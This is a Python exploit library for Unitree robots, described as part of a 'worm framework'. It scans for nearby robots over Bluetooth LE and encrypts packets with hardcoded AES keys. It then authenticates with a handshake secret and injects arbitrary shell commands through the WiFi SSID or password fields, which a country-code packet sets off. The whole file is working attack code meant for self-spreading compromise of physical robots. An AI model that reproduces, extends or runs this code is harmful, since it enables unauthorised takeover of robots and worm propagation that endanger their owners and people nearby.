#!/usr/bin/env python3
"""
Unitree Robot BLE Exploit Library
Refactored from unitree_hack.py for use in worm framework
"""

import asyncio
from bleak import BleakScanner, BleakClient
from Cryptodome.Cipher import AES
from typing import List, Optional, Callable, Tuple
from uniroam import config

# ============================================================================
# Encryption/Decryption
# ============================================================================

def encrypt_data(data: bytes) -> bytes:
    """Encrypt data using hardcoded AES key/IV"""
    cipher = AES.new(config.AES_KEY, AES.MODE_CFB, iv=config.AES_IV, segment_size=128)
    return cipher.encrypt(data)

def decrypt_data(data: bytes) -> bytes:
    """Decrypt data using hardcoded AES key/IV"""
    cipher = AES.new(config.AES_KEY, AES.MODE_CFB, iv=config.AES_IV, segment_size=128)
    return cipher.decrypt(data)

# ============================================================================
# Packet Construction
# ============================================================================

def create_packet(instruction: int, data_bytes: Optional[List[int]] = None) -> bytes:
    """
    Create encrypted BLE packet for Unitree robot
    
    Args:
        instruction: Instruction code (1-6)
        data_bytes: Optional data payload
    
    Returns:
        Encrypted packet ready for transmission
    """
    instruction_data = [instruction]
    if data_bytes:
        instruction_data.extend(data_bytes)
    
    length = len(instruction_data) + 3
    full_data = [0x52, length] + instruction_data
    checksum = -sum(full_data) & 0xFF
    plain_data = full_data + [checksum]
    
    return encrypt_data(bytes(plain_data))

def validate_response(response: bytes, expected_instruction: int) -> bool:
    """
    Validate response packet from robot
    
    Args:
        response: Decrypted response packet
        expected_instruction: Expected instruction code
    
    Returns:
        True if packet is valid and successful
    """
    if len(response) < 5:
        return False
    
    if response[0] != 0x51:  # Response opcode
        return False
    
    if len(response) != response[1]:  # Length check
        return False
    
    if response[2] != expected_instruction:  # Instruction mismatch
        return False
    
    expected_checksum = -sum(response[:-1]) & 0xFF
    if response[-1] != expected_checksum:  # Checksum failure
        return False
    
    return response[3] == 0x01  # Success flag

# ============================================================================
# BLE Device Discovery
# ============================================================================

async def scan_for_robots(timeout: float = 30.0, filter_hci: str = "hci0") -> List:
    """
    Scan for Unitree robots via BLE
    
    Args:
        timeout: Scan duration in seconds
        filter_hci: HCI interface to use (Linux only)
    
    Returns:
        List of discovered Unitree robot devices
    """
    scanner_kwargs = {
        "scanning_mode": "active",
        "activation_timeout": timeout,
    }
    
    # Add bluez filter for Linux
    try:
        scanner_kwargs["bluez"] = {"device_filter": filter_hci}
    except:
        pass  # Not on Linux, skip HCI filter
    
    devices_adv = await BleakScanner.discover(
        timeout=timeout,
        return_adv=True,
        **scanner_kwargs
    )
    
    compatible = []
    for device, adv in devices_adv.values():
        if device.name and any(device.name.startswith(prefix) for prefix in config.SUPPORTED_MODELS):
            compatible.append(device)
    
    return compatible

# ============================================================================
# Exploit Execution
# ============================================================================

class UnitreeExploit:
    """
    Unitree robot BLE exploit handler
    """
    
    def __init__(self, device):
        self.device = device
        self.client = None
        self.notification_event = None
        self.received_value = [None]
        self.serial_chunks = {}
        self.serial_number = None
    
    async def notification_handler(self, sender, data):
        """Handle BLE notifications from robot"""
        decrypted_value = decrypt_data(data)
        
        if len(decrypted_value) < 5 or decrypted_value[0] != 0x51:
            return  # Corrupted packet
        
        response_type = decrypted_value[2]
        
        # Handle serial number chunks (instruction 2)
        if response_type == 0x02:
            chunk_index = decrypted_value[3]
            total_chunks = decrypted_value[4]
            chunk_data = decrypted_value[5:-1]
            
            self.serial_chunks[chunk_index] = chunk_data
            
            if len(self.serial_chunks) == total_chunks:
                serial_number = b"".join(self.serial_chunks[i] for i in sorted(self.serial_chunks.keys()))
                self.serial_number = serial_number.decode('utf-8').rstrip('\x00')
                self.serial_chunks.clear()
                self.notification_event.set()
        else:
            self.received_value[0] = decrypted_value
            self.notification_event.set()
    
    async def wait_for_notification(self, validator: Callable, timeout: float = 10.0):
        """Wait for and validate notification response"""
        try:
            await asyncio.wait_for(self.notification_event.wait(), timeout)
            if validator(self.received_value[0]):
                return self.received_value[0]
            else:
                raise ValueError("Invalid notification")
        except asyncio.TimeoutError:
            raise TimeoutError("No response from robot")
    
    async def connect(self) -> bool:
        """
        Establish BLE connection to robot
        
        Returns:
            True if connection successful
        """
        try:
            self.client = BleakClient(self.device.address, timeout=config.BLE_CONNECTION_TIMEOUT)
            await self.client.connect()
            
            self.notification_event = asyncio.Event()
            
            # Try primary notification handle
            try:
                await self.client.start_notify(config.NOTIFY_CHAR_UUID, self.notification_handler)
            except Exception:
                # Fallback to handle 13
                await self.client.start_notify(13, self.notification_handler)
            
            return True
        except Exception as e:
            return False
    
    async def disconnect(self):
        """Disconnect from robot"""
        if self.client and self.client.is_connected:
            await self.client.disconnect()
    
    async def send_handshake(self) -> bool:
        """
        Send authentication handshake
        
        Returns:
            True if handshake successful
        """
        handshake_bytes = config.HANDSHAKE_SECRET.encode('utf-8')
        handshake_packet = create_packet(instruction=1, data_bytes=[0, 0] + list(handshake_bytes))
        
        await self.client.write_gatt_char(config.WRITE_CHAR_UUID, handshake_packet, response=True)
        
        await self.wait_for_notification(
            lambda r: validate_response(r, expected_instruction=1)
        )
        self.notification_event.clear()
        
        return True
    
    async def get_serial_number(self) -> Optional[str]:
        """
        Retrieve robot serial number
        
        Returns:
            Serial number string or None
        """
        serial_packet = create_packet(instruction=2, data_bytes=[0])
        await self.client.write_gatt_char(config.WRITE_CHAR_UUID, serial_packet, response=True)
        
        await asyncio.wait_for(self.notification_event.wait(), timeout=2.0)
        self.notification_event.clear()
        
        return self.serial_number
    
    async def init_wifi_mode(self, mode: int = 2) -> bool:
        """
        Initialize WiFi mode
        
        Args:
            mode: 1 for AP mode, 2 for STA mode
        
        Returns:
            True if successful
        """
        init_packet = create_packet(instruction=3, data_bytes=[mode])
        await self.client.write_gatt_char(config.WRITE_CHAR_UUID, init_packet, response=True)
        
        await self.wait_for_notification(
            lambda r: validate_response(r, expected_instruction=3)
        )
        self.notification_event.clear()
        
        return True
    
    async def set_ssid(self, ssid: str) -> bool:
        """
        Set WiFi SSID (injection point)
        
        Args:
            ssid: WiFi SSID or injection payload
        
        Returns:
            True if successful
        """
        ssid_bytes = ssid.encode('utf-8')
        total_chunks = (len(ssid_bytes) + config.BLE_CHUNK_SIZE - 1) // config.BLE_CHUNK_SIZE
        
        for i in range(total_chunks):
            start = i * config.BLE_CHUNK_SIZE
            chunk = ssid_bytes[start:start + config.BLE_CHUNK_SIZE]
            packet = create_packet(instruction=4, data_bytes=[i + 1, total_chunks] + list(chunk))
            
            await self.client.write_gatt_char(config.WRITE_CHAR_UUID, packet, response=True)
            
            if i + 1 == total_chunks:
                await self.wait_for_notification(
                    lambda r: validate_response(r, expected_instruction=4)
                )
                self.notification_event.clear()
        
        return True
    
    async def set_password(self, password: str) -> bool:
        """
        Set WiFi password (injection point)
        
        Args:
            password: WiFi password or injection payload
        
        Returns:
            True if successful
        """
        pass_bytes = password.encode('utf-8')
        total_chunks = (len(pass_bytes) + config.BLE_CHUNK_SIZE - 1) // config.BLE_CHUNK_SIZE
        
        for i in range(total_chunks):
            start = i * config.BLE_CHUNK_SIZE
            chunk = pass_bytes[start:start + config.BLE_CHUNK_SIZE]
            packet = create_packet(instruction=5, data_bytes=[i + 1, total_chunks] + list(chunk))
            
            await self.client.write_gatt_char(config.WRITE_CHAR_UUID, packet, response=True)
            await asyncio.sleep(0.1)
            
            if i + 1 == total_chunks:
                await self.wait_for_notification(
                    lambda r: validate_response(r, expected_instruction=5),
                    timeout=5.0
                )
                self.notification_event.clear()
        
        return True
    
    async def set_country_code(self, country_code: str = "US") -> bool:
        """
        Set country code and trigger WiFi configuration (executes injection)
        
        Args:
            country_code: Two-letter country code
        
        Returns:
            True if successful
        """
        country_code_bytes = country_code.encode('utf-8') + b'\x00'
        country_packet = create_packet(instruction=6, data_bytes=[1] + list(country_code_bytes))
        
        await self.client.write_gatt_char(config.WRITE_CHAR_UUID, country_packet, response=True)
        
        await self.wait_for_notification(
            lambda r: validate_response(r, expected_instruction=6)
        )
        self.notification_event.clear()
        
        return True
    
    async def execute_command(self, cmd: str, use_wifi_config: Optional[Tuple[str, str]] = None) -> bool:
        """
        Execute arbitrary command on robot via injection
        
        Args:
            cmd: Shell command to execute
            use_wifi_config: Optional (ssid, password) tuple for legitimate WiFi config
        
        Returns:
            True if exploit executed successfully
        """
        try:
            # Connect and authenticate
            if not await self.connect():
                return False
            
            await self.send_handshake()
            await self.get_serial_number()
            await self.init_wifi_mode(mode=2)  # STA mode
            
            # Build injection payload
            injection_payload = config.build_injection_payload(cmd)
            
            if use_wifi_config:
                # Inject via password, use real SSID
                ssid, password = use_wifi_config
                await self.set_ssid(ssid)
                await self.set_password(password + injection_payload)
            else:
                # Inject via SSID
                await self.set_ssid(injection_payload)
                await self.set_password("")
            
            # Trigger execution
            await self.set_country_code(config.WIFI_COUNTRY_CODE)
            
            return True
            
        except Exception as e:
            return False
        finally:
            await self.disconnect()

# ============================================================================
# High-level helper functions
# ============================================================================

async def find_nearby_robots(timeout: float = 30.0) -> List:
    """
    Convenience function to find nearby Unitree robots
    
    Args:
        timeout: Scan duration
    
    Returns:
        List of robot devices
    """
    return await scan_for_robots(timeout=timeout)

async def exploit_robot(device, command: str, wifi_config: Optional[Tuple[str, str]] = None) -> Tuple[bool, Optional[str]]:
    """
    Exploit a robot with a command
    
    Args:
        device: BLE device object
        command: Command to execute
        wifi_config: Optional (ssid, password) for legitimate WiFi
    
    Returns:
        (success: bool, serial_number: Optional[str])
    """
    exploit = UnitreeExploit(device)
    success = await exploit.execute_command(command, use_wifi_config=wifi_config)
    return success, exploit.serial_number

